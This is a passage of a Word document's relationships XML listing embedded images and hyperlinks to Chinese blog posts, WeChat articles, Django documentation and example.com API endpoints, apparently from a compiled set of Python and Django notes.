Target="https://www.cnblogs.com/sui776265233/p/9664642.html" TargetMode="External"/><Relationship Id="rId154" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image81.png"/><Relationship Id="rId175" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image97.png"/><Relationship Id="rId340" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483897&amp;idx=1&amp;sn=69765d08f1de3e73a22589ef75f6d4a9&amp;chksm=a73c61c1904be8d7c212571cfeb466972c27af4adc411d4c344292e8d3a49b7544488c21f803&amp;scene=21" TargetMode="External"/><Relationship Id="rId196" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image109.jpeg"/><Relationship Id="rId200" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMjM5OTMyODA4Nw%3D%3D%26mid%3D2247483764%26idx%3D1%26sn%3Df0756dbb9887a05280e6464194477e1d%26chksm%3Da73c614c904be85a8380a0d93155a5f70b9cdecf716f452ff9274a9ebeac1c194001beed7b23%26scene%3D21%23wechat_redirect" TargetMode="External"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image6.jpeg"/><Relationship Id="rId221" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.example.com/goods" TargetMode="External"/><Relationship Id="rId242" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483679&amp;idx=2&amp;sn=9e3db4167e408a2a0c3a1037c4f7266a&amp;chksm=a73c6127904be831aee7abe13980fbea5e2d611ceb48e346dc0fc083c0a8725b52ebb3b8106f&amp;scene=21" TargetMode="External"/><Relationship Id="rId263" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483931&amp;idx=1&amp;sn=dcedf1b71eea1bcedab37fc6321caffd&amp;chksm=a73c6223904beb35a0994c7f4e85582074c17543bafb2c837e5af5f6c043f873d2b7fbd9dbea&amp;scene=21" TargetMode="External"/><Relationship Id="rId284" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484184&amp;idx=1&amp;sn=1e4845e1784db7d106565e6838f542aa&amp;chksm=a73c6320904bea36ffd83eaccfab028cc5e81fca8cd74aa1637f74ce084d01c1e4ec506fef5b&amp;scene=21" TargetMode="External"/><Relationship Id="rId319" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483880&amp;idx=1&amp;sn=fa0c382260bbfdf49604f020db3fb054&amp;chksm=a73c61d0904be8c6700d7990d6f092178e2e4626673efec4e45c13770208f603c71231971226&amp;scene=21" TargetMode="External"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image27.jpeg"/><Relationship Id="rId58" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190704192057045-340067354.png" TargetMode="External"/><Relationship Id="rId79" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image46.png"/><Relationship Id="rId102" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190706171650177-1009336205.png" TargetMode="External"/><Relationship Id="rId123" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.crazyant.net/wp-content/uploads/2012/08/12.png" TargetMode="External"/><Relationship Id="rId144" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cnblogs.com/daofaziran/articles/10517974.html" TargetMode="External"/><Relationship Id="rId330" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484026&amp;idx=1&amp;sn=3f320aa57ac00c3fef4ea249228ccf6f&amp;chksm=a73c6242904beb545006e523208638051c79ea2e4bb6504e7a019761f8dd2bfc9269d12324ca&amp;scene=21" TargetMode="External"/><Relationship Id="rId90" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190706165042261-205322898.png" TargetMode="External"/><Relationship Id="rId165" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.213.name/wp-content/uploads/2017/08/QQ%E6%88%AA%E5%9B%BE20170821154007.png" TargetMode="External"/><Relationship Id="rId186" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image105.png"/><Relationship Id="rId351" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image119.png"/><Relationship Id="rId211" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.example.com/app/1.2/info" TargetMode="External"/><Relationship Id="rId232" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483679&amp;idx=2&amp;sn=9e3db4167e408a2a0c3a1037c4f7266a&amp;chksm=a73c6127904be831aee7abe13980fbea5e2d611ceb48e346dc0fc083c0a8725b52ebb3b8106f&amp;scene=21" TargetMode="External"/><Relationship Id="rId253" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483716&amp;idx=2&amp;sn=2c0ac2f977c063c67503a9ff3f8d4d0c&amp;chksm=a73c617c904be86a16e7389c3d66760b86e06dd2f5f2f0f0ef6007b38d32647d8700e2a0a48a&amp;scene=21" TargetMode="External"/><Relationship Id="rId274" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483813&amp;idx=1&amp;sn=bda48ff63fd4cc3b2cc0de408e7a1fa1&amp;chksm=a73c619d904be88b13d9c27bc4afb5ca45c76473c5d56cf3b5a0f7f9cf7a57775168ff6150f1&amp;scene=21" TargetMode="External"/><Relationship Id="rId295" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484195&amp;idx=1&amp;sn=0f92015bf28c53ad4ae48a5cc1d9e0da&amp;chksm=a73c631b904bea0d17e994b76ddbb78b18a3bdada1162dfdec4f023efe3bd8bca4dfda13018f&amp;scene=21" TargetMode="External"/><Relationship Id="rId309" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483810&amp;idx=1&amp;sn=d554570c8bd12560ec669aa67c0ee21a&amp;chksm=a73c619a904be88c197d6eac09466bc7ab214a57e26b11bb09da9a33fa1cef349277448c8325&amp;scene=21" TargetMode="External"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image17.png"/><Relationship Id="rId48" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cnblogs.com/wcwnina/p/9099561.html" TargetMode="External"/><Relationship Id="rId69" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image41.png"/><Relationship Id="rId113" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image64.png"/><Relationship Id="rId134" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cnblogs.com/sui776265233/p/9664642.html" TargetMode="External"/><Relationship Id="rId320" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483919&amp;idx=1&amp;sn=92b03ee62de5d59d730847a40204c536&amp;chksm=a73c6237904beb219eeead51d36d0bf8c47497055db2983e7e4de382a5b5c306d345693ee5a3&amp;scene=21" TargetMode="External"/><Relationship Id="rId80" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190706122651549-1261997647.png" TargetMode="External"/><Relationship Id="rId155" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image82.png"/><Relationship Id="rId176" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image98.png"/><Relationship Id="rId197" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMjM5OTMyODA4Nw%3D%3D%26mid%3D2247484447%26idx%3D1%26sn%3D1c8292f771ae69e7b7313d46a9fb212f%26chksm%3Da73c6427904bed315f108724384a1f3c134ec1bc2dd09d08f5227b0debbfd219fd0864f48fe2%26scene%3D21%23wechat_redirect" TargetMode="External"/><Relationship Id="rId341" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId201" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMjM5OTMyODA4Nw%3D%3D%26mid%3D2247484237%26idx%3D1%26sn%3Dc2d050ff33d2957e8971034476cd8326%26chksm%3Da73c6375904bea639b58f93cb82e714e8ae339f195818179ad9cb15e1413a2b63fcd1f30039f%26scene%3D21%23wechat_redirect" TargetMode="External"/><Relationship Id="rId222" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.example.com/goods/cup" TargetMode="External"/><Relationship Id="rId243" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483716&amp;idx=2&amp;sn=2c0ac2f977c063c67503a9ff3f8d4d0c&amp;chksm=a73c617c904be86a16e7389c3d66760b86e06dd2f5f2f0f0ef6007b38d32647d8700e2a0a48a&amp;scene=21" TargetMode="External"/><Relationship Id="rId264" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483938&amp;idx=1&amp;sn=0ac10883d95da506d3e780c6154c4ec7&amp;chksm=a73c621a904beb0cfc9e03b0ace4547405c4520bb0e0b00279237cfb5a7526c2ec4e4474a3cc&amp;scene=21" TargetMode="External"/><Relationship Id="rId285" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image7.jpeg"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cnblogs.com/pythonClub/p/9863448.html" TargetMode="External"/><Relationship Id="rId59" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image36.png"/><Relationship Id="rId103" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image58.png"/><Relationship Id="rId124" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image68.png"/><Relationship Id="rId310" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId70" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190705211653015-129978653.png" TargetMode="External"/><Relationship Id="rId91" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image52.png"/><Relationship Id="rId145" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cnblogs.com/huxiaoyi/p/10090820.html" TargetMode="External"/><Relationship Id="rId166" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image91.png"/><Relationship Id="rId187" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image106.png"/><Relationship Id="rId331" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484034&amp;idx=1&amp;sn=ab08c3498f6a249fb0b43a559f1a00c0&amp;chksm=a73c62ba904bebacf6ee9e8ab88c7a0f8debd7f74a11df508ccf9649994e748f17d9126edfaa&amp;scene=21" TargetMode="External"/><Relationship Id="rId352"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hyperlink" Target="http://www.example.com/getGoods" TargetMode="External"/><Relationship Id="rId233" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId254" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483764&amp;idx=1&amp;sn=f0756dbb9887a05280e6464194477e1d&amp;chksm=a73c614c904be85a8380a0d93155a5f70b9cdecf716f452ff9274a9ebeac1c194001beed7b23&amp;scene=21" TargetMode="External"/><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hyperlink" Target="https://www.cnblogs.com/witt-chen/p/12489463.html" TargetMode="External"/><Relationship Id="rId275" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484108&amp;idx=1&amp;sn=778143f345cb77c647f43cd7d90778ad&amp;chksm=a73c62f4904bebe23412cf002d27a2dd71034031fd32da36a2eb4a2e565feeb54c445eb88110&amp;scene=21" TargetMode="External"/><Relationship Id="rId296" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484184&amp;idx=1&amp;sn=1e4845e1784db7d106565e6838f542aa&amp;chksm=a73c6320904bea36ffd83eaccfab028cc5e81fca8cd74aa1637f74ce084d01c1e4ec506fef5b&amp;scene=21" TargetMode="External"/><Relationship Id="rId300" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484269&amp;idx=1&amp;sn=c832969a57a138c33bb1e2b19235b5c9&amp;chksm=a73c6355904bea437b1480c018379583397948be69072114b41e98c50162bc135efbf5be3ce6&amp;scene=21" TargetMode="External"/><Relationship Id="rId60" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190704193554178-1899652738.png" TargetMode="External"/><Relationship Id="rId81" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image47.png"/><Relationship Id="rId135" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cnblogs.com/sui776265233/p/9664642.html" TargetMode="External"/><Relationship Id="rId156" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image83.png"/><Relationship Id="rId177" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cnblogs.com/wuyan717/p/9317041.html" TargetMode="External"/><Relationship Id="rId198" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image110.jpeg"/><Relationship Id="rId321" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483959&amp;idx=1&amp;sn=f48efbb42b3f67c7ac01beb3f81545db&amp;chksm=a73c620f904beb1922ba1dd00ee15871d4ffdcd762861091af5f83e3b1f90391447463b12727&amp;scene=21" TargetMode="External"/><Relationship Id="rId342" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483887&amp;idx=2&amp;sn=3d8531c15ffda4faa32bde775bfd61fb&amp;chksm=a73c61d7904be8c1621603284549aa7eca6e144d8603e6759172d6b5a6b92a0bf6e08ab2d672&amp;scene=21" TargetMode="External"/><Relationship Id="rId202" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMjM5OTMyODA4Nw%3D%3D%26mid%3D2247484195%26idx%3D1%26sn%3D0f92015bf28c53ad4ae48a5cc1d9e0da%26chksm%3Da73c631b904bea0d17e994b76ddbb78b18a3bdada1162dfdec4f023efe3bd8bca4dfda13018f%26scene%3D21%23wechat_redirect" TargetMode="External"/><Relationship Id="rId223" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.example.com/goods" TargetMode="External"/><Relationship Id="rId244" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483780&amp;idx=1&amp;sn=8d8e19c5d21efe986eaa62dce8f78e67&amp;chksm=a73c61bc904be8aa62f8933ab711ce35fed85dd99be7cee5f4c622599dcdee48305c26f9b5b0&amp;scene=21" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image8.jpeg"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.py.cn/kuangjia/django/11518.html" TargetMode="External"/><Relationship Id="rId265" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483945&amp;idx=1&amp;sn=f6f62eb51b4c95024cd6a23190e25893&amp;chksm=a73c6211904beb07dee79af98780387c46a4cb72f4363c5f2797ffefc39e1ea548c8ee047ad7&amp;scene=21" TargetMode="External"/><Relationship Id="rId286" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484189&amp;idx=1&amp;sn=f5402c86aeaacab1eeaa2a021bb60e79&amp;chksm=a73c6325904bea33513a0426971e70c43779b9519b5f9eace0ef2d96d9b082a834c34d88c899&amp;scene=21" TargetMode="External"/><Relationship Id="rId50" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190704183032082-654300147.png" TargetMode="External"/><Relationship Id="rId104" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190706172015746-420258448.png" TargetMode="External"/><Relationship Id="rId125" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.crazyant.net/wp-content/uploads/2012/08/sdf.png" TargetMode="External"/><Relationship Id="rId146" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.algotech.solutions/blog/python/django-migrations-and-how-to-manage-conflicts/" TargetMode="External"/><Relationship Id="rId167" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.213.name/wp-content/uploads/2017/08/QQ%E6%88%AA%E5%9B%BE20170821151228.png" TargetMode="External"/><Relationship Id="rId188" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://models.py/" TargetMode="External"/><Relationship Id="rId311" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image118.jpeg"/><Relationship Id="rId332" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484150&amp;idx=1&amp;sn=ab1d6d856568e636dc96763898a870ee&amp;chksm=a73c62ce904bebd8c97429c8adf39f1feea0c46a46ba52cefb797a00814273047b83d21f3113&amp;scene=21" TargetMode="External"/><Relationship Id="rId353" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image121.png"/><Relationship Id="rId71" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image42.png"/><Relationship Id="rId92" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190706170339368-1199274875.png" TargetMode="External"/><Relationship Id="rId213" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.example.com/listOrders" TargetMode="External"/><Relationship Id="rId234" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483716&amp;idx=2&amp;sn=2c0ac2f977c063c67503a9ff3f8d4d0c&amp;chksm=a73c617c904be86a16e7389c3d66760b86e06dd2f5f2f0f0ef6007b38d32647d8700e2a0a48a&amp;scene=21"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mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483780&amp;idx=1&amp;sn=8d8e19c5d21efe986eaa62dce8f78e67&amp;chksm=a73c61bc904be8aa62f8933ab711ce35fed85dd99be7cee5f4c622599dcdee48305c26f9b5b0&amp;scene=21" TargetMode="External"/><Relationship Id="rId276" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId297" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483914&amp;idx=1&amp;sn=368657c4efc342d7d8e26a23f8209eb0&amp;chksm=a73c6232904beb249bd3705fdd09176b97fac5f49f152f846d5d10a3dac34e9ae88614f4e43d&amp;scene=21" TargetMode="External"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cnblogs.com/wdliu/p/9517535.html" TargetMode="External"/><Relationship Id="rId115" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cnblogs.com/python99/p/12307629.html" TargetMode="External"/><Relationship Id="rId136" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cnblogs.com/sui776265233/p/9664642.html" TargetMode="External"/><Relationship Id="rId157" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image84.png"/><Relationship Id="rId178" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cnblogs.com/Rglin/p/10786317.html" TargetMode="External"/><Relationship Id="rId301" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483696&amp;idx=1&amp;sn=6c01e4f01dd274b05a0887a1ff04ad8a&amp;chksm=a73c6108904be81e369adea15cfec39ced7cac33e4c68564477b2755c7fb0b11c7419b2a28eb&amp;scene=21" TargetMode="External"/><Relationship Id="rId322" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483968&amp;idx=1&amp;sn=be82552e1d1641c3aa69c3fb9b39a542&amp;chksm=a73c6278904beb6ed786e5394f831bebfa75c909ed6f0ed7ca9a4a235024309c9f047f403b4d&amp;scene=21" TargetMode="External"/><Relationship Id="rId343" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId61" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image37.png"/><Relationship Id="rId82" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190706130915161-896233471.png" TargetMode="External"/><Relationship Id="rId199" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMjM5OTMyODA4Nw%3D%3D%26mid%3D2247483949%26idx%3D1%26sn%3Dbc4c8929d5f8e99a769c63f2208ed6eb%26chksm%3Da73c6215904beb033f3277e3d1a98aaeece313792649cf96eea77cb1ee3d06bb493d06bc0c99%26scene%3D21%23wechat_redirect" TargetMode="External"/><Relationship Id="rId203" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMjM5OTMyODA4Nw%3D%3D%26mid%3D2247484306%26idx%3D1%26sn%3D48a89cdf74edff43d727c61ac14b480a%26chksm%3Da73c63aa904beabc1975f9e38bafb36ac9fff041b0a468fa66c82279b03c1fdbf9364731e0c6%26scene%3D21%23wechat_redirect" TargetMode="External"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image9.jpeg"/><Relationship Id="rId224" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.example.com/goods" TargetMode="External"/><Relationship Id="rId245" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId266" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483949&amp;idx=1&amp;sn=bc4c8929d5f8e99a769c63f2208ed6eb&amp;chksm=a73c6215904beb033f3277e3d1a98aaeece313792649cf96eea77cb1ee3d06bb493d06bc0c99&amp;scene=21" TargetMode="External"/><Relationship Id="rId287" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image20.jpeg"/><Relationship Id="rId105" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image59.png"/><Relationship Id="rId126" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image69.png"/><Relationship Id="rId147" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://docs.djangoproject.com/en/1.9/topics/migrations/" TargetMode="External"/><Relationship Id="rId168" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image92.png"/><Relationship Id="rId312" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483703&amp;idx=1&amp;sn=7d5573c4176147510ee433cbdeddde89&amp;chksm=a73c610f904be8194c597dc75a2bbd544c4ea230f84c92994de8239171cbefca4901e7ef2be7&amp;scene=21" TargetMode="External"/><Relationship Id="rId333" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId354" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image122.png"/><Relationship Id="rId51" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image32.png"/><Relationship Id="rId72" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190705212211704-1549700029.png" TargetMode="External"/><Relationship Id="rId93" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image53.png"/><Relationship Id="rId189" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://urls.py/" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId214" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.example.com/app/goods" TargetMode="External"/><Relationship Id="rId235" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId256" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483893&amp;idx=1&amp;sn=3554413878374aaf95631093d5849cb2&amp;chksm=a73c61cd904be8db56032d32654aca4374fb403e95d949f52a9a3ee57718a9e8641536c15206&amp;scene=21" TargetMode="External"/><Relationship Id="rId277" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484102&amp;idx=1&amp;sn=7bd1df46dee7ba89c2c13716449a6221&amp;chksm=a73c62fe904bebe8ae74ac967cb1f9d039abd9eba3b95ccdf2585de4ee5ad3134a30e6ed429f&amp;scene=21" TargetMode="External"/><Relationship Id="rId298" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" 